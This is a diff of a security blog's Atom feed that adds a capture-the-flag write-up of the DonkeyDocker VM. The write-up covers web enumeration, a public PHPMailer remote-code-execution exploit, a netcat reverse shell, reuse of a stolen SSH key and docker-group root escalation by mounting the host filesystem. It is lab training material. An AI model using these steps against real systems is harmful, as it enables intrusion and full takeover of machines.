@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2019-04-07T22:48:04+03:00</updated>
+  <updated>2019-04-15T21:12:12+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,471 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Donkey Docker]]></title>
+    <link href="http://chousensha.github.io/blog/2019/04/15/donkey-docker/"/>
+    <updated>2019-04-15T21:02:36+03:00</updated>
+    <id>http://chousensha.github.io/blog/2019/04/15/donkey-docker</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
+</span><span class='line'>|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
+</span><span class='line'>|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+</span><span class='line'>| http-robots.txt: 3 disallowed entries
+</span><span class='line'>|_/contact.php /index.php /about.php
+</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
+</span><span class='line'>|_http-title: Docker Donkey</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not much to work with, let&rsquo;s hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.</p>
+
+<p>In the HTML source, I found a comment:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- FIXME!: www-path: /www --&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Didn&rsquo;t find such a path with my enumeration. I fired up Gobuster next:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
+</span><span class='line'>/.htpasswd (Status: 403)
+</span><span class='line'>/.htaccess (Status: 403)
+</span><span class='line'>/about (Status: 200)
+</span><span class='line'>/assets (Status: 301)
+</span><span class='line'>/contact (Status: 200)
+</span><span class='line'>/css (Status: 301)
+</span><span class='line'>/dist (Status: 301)
+</span><span class='line'>/index (Status: 200)
+</span><span class='line'>/mailer (Status: 301)
+</span><span class='line'>/robots.txt (Status: 200)
+</span><span class='line'>/server-status (Status: 403)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
+</span><span class='line'>/.htpasswd (Status: 403)
+</span><span class='line'>/.htaccess (Status: 403)
+</span><span class='line'>/LICENSE (Status: 200)
+</span><span class='line'>/docs (Status: 301)
+</span><span class='line'>/examples (Status: 301)
+</span><span class='line'>/extras (Status: 301)
+</span><span class='line'>/language (Status: 301)
+</span><span class='line'>/test (Status: 301)
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to <a href="http://192.168.159.132/mailer/VERSION">http://192.168.159.132/mailer/VERSION</a> and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:</p>
+
+<blockquote><p>PHPMailer versions up to and including 5.2.19 are affected by a
+ vulnerability which can be leveraged by an attacker to write a file
+ with partially controlled contents to an arbitrary location through
+ injection of arguments that are passed to the sendmail binary. This
+ module writes a payload to the web root of the webserver before then
+ executing it with an HTTP request. The user running PHPMailer must
+ have write access to the specified WEB_ROOT directory and successful
+ exploitation can take a few minutes.</p></blockquote>
+
+<p>This one didn&rsquo;t work for me, so I found another one with <a href="https://www.exploit-db.com/exploits/40974">searchsploit</a>. To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://192.168.159.132/contact&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Per the <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">advisory</a>:</p>
+
+<blockquote><p>To exploit the vulnerability an attacker could target common website
+components such as contact/feedback forms, registration forms, password
+email resets and others that send out emails with the help of a vulnerable
+version of the PHPMailer class.</p></blockquote>
+
+<p>After finishing the modifications, I ran it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
+</span><span class='line'>Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski
+</span><span class='line'>
+</span><span class='line'>[+] SeNdiNG eVIl SHeLL To TaRGeT....
+</span><span class='line'>[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With a listener on, I went to <a href="http://192.168.159.132/backdoor">http://192.168.159.132/backdoor</a> and got a reverse shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 9000
+</span><span class='line'>listening on [any] 9000 ...
+</span><span class='line'>connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
+</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
+</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'
+</span><span class='line'>www-data@12081bd067cc:/www$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the hostname, we seem to be inside a Docker container. In the root directory I found a script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@12081bd067cc:/www$ cat /main.sh
+</span><span class='line'>cat /main.sh
+</span><span class='line'>#!/bin/bash
+</span><span class='line'>
+</span><span class='line'># change permission
+</span><span class='line'>chown smith:users /home/smith/flag.txt
+</span><span class='line'>
+</span><span class='line'># Start apache
+</span><span class='line'>source /etc/apache2/envvars
+</span><span class='line'>a2enmod rewrite
+</span><span class='line'>apachectl -f /etc/apache2/apache2.conf
+</span><span class='line'>
+</span><span class='line'>sleep 3
+</span><span class='line'>tail -f /var/log/apache2/*&
+</span><span class='line'>
+</span><span class='line'># Start our fake smtp server
+</span><span class='line'>python -m smtpd -n -c DebuggingServer localhost:25</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smith@12081bd067cc:~$ ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 28
+</span><span class='line'>drwx------ 1 smith users 4096 Mar 26  2017 .
+</span><span class='line'>drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
+</span><span class='line'>-rw-r--r-- 1 smith users  220 Nov  5  2016 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 smith users 3515 Nov  5  2016 .bashrc
+</span><span class='line'>-rw-r--r-- 1 smith users  675 Nov  5  2016 .profile
+</span><span class='line'>drwx--S--- 2 smith users 4096 Mar 22  2017 .ssh
+</span><span class='line'>-rw-r--r-- 1 smith users  237 Mar 22  2017 flag.txt
+</span><span class='line'>smith@12081bd067cc:~$ cat flag.txt
+</span><span class='line'>cat flag.txt
+</span><span class='line'>This is not the end, sorry dude. Look deeper!
+</span><span class='line'>I know nobody created a user into a docker
+</span><span class='line'>container but who cares? ;-)
+</span><span class='line'>
+</span><span class='line'>But good work!
+</span><span class='line'>Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}
+</span><span class='line'>
+</span><span class='line'>PS: I like 1984 written by George ORWELL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside smith&rsquo;s home we also have a .ssh folder. Inside we have a pair of private-public keys.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
+</span><span class='line'>-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
+</span><span class='line'>smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
+</span><span class='line'>cat id_ed25519.pub
+</span><span class='line'>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -i id_ed25519 orwell@192.168.159.132
+</span><span class='line'>Welcome to
+</span><span class='line'>
+</span><span class='line'>  ___           _            ___          _
+</span><span class='line'> |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
+</span><span class='line'> | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
+</span><span class='line'> |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
+</span><span class='line'>                        |__/
+</span><span class='line'>                             Made with &lt;3 v.1.0 - 2017
+</span><span class='line'>
+</span><span class='line'>This is my first boot2root - CTF VM. I hope you enjoy it.
+</span><span class='line'>if you run into any issue you can find me on Twitter: @dhn_
+</span><span class='line'>or feel free to write me a mail to:
+</span><span class='line'>
+</span><span class='line'> - Email: dhn@zer0-day.pw
+</span><span class='line'> - GPG key: 0x2641123C
+</span><span class='line'> - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C
+</span><span class='line'>
+</span><span class='line'>Level:       I think the level of this boot2root challange
+</span><span class='line'>             is hard or intermediate.
+</span><span class='line'>
+</span><span class='line'>Try harder!: If you are confused or frustrated don't forget
+</span><span class='line'>             that enumeration is the key!
+</span><span class='line'>
+</span><span class='line'>Thanks:      Special thanks to @1nternaut for the awesome
+</span><span class='line'>             CTF VM name!
+</span><span class='line'>
+</span><span class='line'>Feedback:    This is my first boot2root - CTF VM, please
+</span><span class='line'>             give me feedback on how to improve!
+</span><span class='line'>
+</span><span class='line'>Looking forward to the write-ups!
+</span><span class='line'>
+</span><span class='line'>donkeydocker:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It worked! In orwell&rsquo;s home we find another flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ ls -al /home/orwell
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
+</span><span class='line'>drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
+</span><span class='line'>-rw-r--r--    1 root     orwell           1 Mar 26  2017 .ash
+</span><span class='line'>-rw-------    1 orwell   orwell          45 Apr 15 18:12 .ash_history
+</span><span class='line'>drwx--S---    2 orwell   users         4096 Mar 22  2017 .ssh
+</span><span class='line'>-rw-r--r--    1 orwell   orwell         104 Mar 22  2017 flag.txt
+</span><span class='line'>donkeydocker:~$ cat flag.txt
+</span><span class='line'>You tried harder! Good work ;-)
+</span><span class='line'>
+</span><span class='line'>Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we seem to be on the Docker host itself. Let&rsquo;s confirm:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker ps
+</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see the container we were in previously. Now, for the next step, I used as reference this blog post about <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Docker privilege escalation</a>. The highlights are :</p>
+
+<blockquote><p>If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</p>
+
+<p>The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
+that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</p>
+
+<p>The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
+This effectively gives you root on the machine.</p></blockquote>
+
+<p>And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ id
+</span><span class='line'>uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s look at the available containers now:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker container ls
+</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker run -d -v /:/host donkeydocker
+</span><span class='line'>103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we should find the host / contents in the /host directory inside the container. Let&rsquo;s verify that it was created:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker container ls
+</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
+</span><span class='line'>103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
+</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now we can run a root shell inside the container and read the host flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
+</span><span class='line'>root@103cd9c625b0:/# ls /host/root
+</span><span class='line'>donkeydocker  flag.txt
+</span><span class='line'>root@103cd9c625b0:/# cat /host/root/flag.txt
+</span><span class='line'>YES!! You did it :-). Congratulations!
+</span><span class='line'>
+</span><span class='line'>I hope you enjoyed this CTF VM.
+</span><span class='line'>
+</span><span class='line'>Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw
+</span><span class='line'>
+</span><span class='line'>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice Docker twist on this VM! To recap the steps:</p>
+
+<ul>
+<li>Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data</li>
+<li>the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password</li>
+<li>the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key</li>
+<li>user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>______________________________________
+</span><span class='line'>/ Your motives for doing whatever good \
+</span><span class='line'>| deed you may have in mind will be    |
+</span><span class='line'>\ misinterpreted by somebody.          /
+</span><span class='line'> --------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Hackfest 2016 Orcus]]></title>
@@ -5274,9 +5739,9 @@ file. There are no restrictions on the format of the secret data.</p></blockquot
 <p>The contact page gives us some names and mail addresses:</p>
 
 <ul>
-<li>Roger S. Michaels &ndash; <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#114;&#109;&#105;&#x63;&#104;&#x61;&#101;&#108;&#115;&#x40;&#105;&#109;&#x66;&#46;&#108;&#x6f;&#x63;&#97;&#108;">&#114;&#x6d;&#x69;&#x63;&#104;&#x61;&#x65;&#108;&#x73;&#x40;&#105;&#109;&#x66;&#x2e;&#x6c;&#x6f;&#x63;&#97;&#x6c;</a></li>
-<li>Alexander B. Keith &ndash; <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#97;&#x6b;&#101;&#105;&#x74;&#104;&#64;&#105;&#x6d;&#102;&#x2e;&#108;&#x6f;&#99;&#x61;&#x6c;">&#x61;&#x6b;&#101;&#105;&#116;&#x68;&#64;&#x69;&#x6d;&#x66;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></li>
-<li>Elizabeth R. Stone &ndash; <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#101;&#115;&#116;&#111;&#x6e;&#101;&#64;&#105;&#x6d;&#x66;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;">&#x65;&#x73;&#x74;&#111;&#110;&#101;&#64;&#x69;&#109;&#x66;&#x2e;&#108;&#x6f;&#99;&#x61;&#x6c;</a></li>
+<li>Roger S. Michaels &ndash; <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6d;&#105;&#99;&#x68;&#97;&#x65;&#x6c;&#x73;&#64;&#105;&#x6d;&#x66;&#46;&#x6c;&#x6f;&#x63;&#97;&#x6c;">&#x72;&#109;&#105;&#99;&#104;&#x61;&#101;&#x6c;&#x73;&#x40;&#105;&#x6d;&#102;&#46;&#x6c;&#111;&#x63;&#x61;&#108;</a></li>
+<li>Alexander B. Keith &ndash; <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x61;&#107;&#101;&#x69;&#x74;&#x68;&#64;&#x69;&#109;&#102;&#x2e;&#108;&#x6f;&#99;&#97;&#108;">&#x61;&#107;&#101;&#105;&#x74;&#x68;&#x40;&#x69;&#x6d;&#102;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;</a></li>
+<li>Elizabeth R. Stone &ndash; <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#x65;&#115;&#116;&#111;&#110;&#101;&#64;&#105;&#x6d;&#102;&#46;&#x6c;&#x6f;&#x63;&#x61;&#108;">&#101;&#x73;&#x74;&#x6f;&#110;&#x65;&#64;&#x69;&#109;&#102;&#x2e;&#108;&#111;&#x63;&#x61;&#x6c;</a></li>
 </ul>
 
 
@@ -13353,701 +13818,6 @@ SERPENT, TWOFISH.
 </span><span class='line'>| consists of sequences of non-blank      |
 </span><span class='line'>\ characters separated by blanks".        /
 </span><span class='line'> -----------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[LFCS prep - Networking]]></title>
-    <link href="http://chousensha.github.io/blog/2018/03/01/lfcs-prep-networking/"/>
-    <updated>2018-03-01T21:12:20+02:00</updated>
-    <id>http://chousensha.github.io/blog/2018/03/01/lfcs-prep-networking</id>
-    <content type="html"><![CDATA[<p>Various commands for the LFCS Networking domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>
-
-<!-- more -->
-
-
-<p><img class="center" src="http://chousensha.github.io/images/sysadmin/network.png" title="networking" alt="linux networking"></p>
-
-<h4>hwclock</h4>
-
-<blockquote><p>query or set the hardware clock (RTC)</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>hwclock
-</span><span class='line'>Wed 18 Oct 2017 07:24:51 PM EEST  -1.042307 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>timedatectl</h4>
-
-<blockquote><p>Control the system time and date</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>timedatectl
-</span><span class='line'>      Local time: Wed 2017-10-18 17:26:49 EEST
-</span><span class='line'>  Universal time: Wed 2017-10-18 14:26:49 UTC
-</span><span class='line'>        RTC time: Wed 2017-10-18 17:26:49
-</span><span class='line'>       Time zone: Europe/Bucharest (EEST, +0300)
-</span><span class='line'>     NTP enabled: no
-</span><span class='line'>NTP synchronized: no
-</span><span class='line'> RTC in local TZ: no
-</span><span class='line'>      DST active: yes
-</span><span class='line'> Last DST change: DST began at
-</span><span class='line'>                  Sun 2017-03-26 02:59:59 EET
-</span><span class='line'>                  Sun 2017-03-26 04:00:00 EEST
-</span><span class='line'> Next DST change: DST ends (the clock jumps one hour backwards) at
-</span><span class='line'>                  Sun 2017-10-29 03:59:59 EEST
-</span><span class='line'>                  Sun 2017-10-29 03:00:00 EET</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>date</h4>
-
-<blockquote><p>print or set the system date and time</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>[root@tron ~]# date
-</span><span class='line'>Tue Sep 19 12:40:58 EEST 2017</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>get the date of a relative point in time</li>
-</ul>
-
-
